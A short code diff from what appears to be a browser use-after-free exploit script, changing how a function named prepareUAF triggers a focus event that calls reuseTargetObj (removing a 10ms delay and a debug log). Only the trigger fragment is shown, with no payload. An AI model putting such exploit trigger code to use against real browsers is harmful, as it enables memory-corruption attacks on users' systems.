@@ -422,8 +422,7 @@ function prepareUAF() {
 
 	g_input.setAttribute("onfocus", "reuseTargetObj()");
 	
-	debug_log("[+] Waiting 10ms for g_input focus");
-	setTimeout(function(){ g_input.autofocus = true;}, 10);
+	g_input.autofocus = true;
 
 }
 
